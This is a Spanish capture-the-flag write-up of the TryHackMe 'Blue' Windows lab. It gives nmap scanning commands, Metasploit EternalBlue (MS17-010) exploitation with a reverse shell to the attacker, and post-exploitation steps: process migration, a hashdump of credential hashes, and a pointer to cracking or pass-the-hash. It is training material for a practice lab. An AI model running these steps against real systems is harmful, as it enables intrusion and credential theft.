---
layout: writeup
title: "Blue"
platform: tryhackme
difficulty: dificil
os: windows
date: 2026-04-10
tags: [eternalblue, ms17-010, metasploit, windows]
description: "Máquina Windows clásica vulnerable a EternalBlue (MS17-010). Explotación con Metasploit."
---

## Reconocimiento

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.X.X
```

Puerto 445 (SMB) abierto. Comprobamos si es vulnerable a MS17-010:

```bash
nmap --script smb-vuln-ms17-010 -p 445 10.10.X.X
```

Resultado: `VULNERABLE`.

## Explotación (EternalBlue)

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.X.X
set LHOST tun0
run
```

Shell obtenida como `NT AUTHORITY\SYSTEM` directamente.

## Post-Explotación

```bash
# Migrar a proceso estable
migrate -N explorer.exe

# Volcar hashes
hashdump
```

Hashes obtenidos:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...
```

Crackear con john o pasar directamente con Pass-the-Hash.
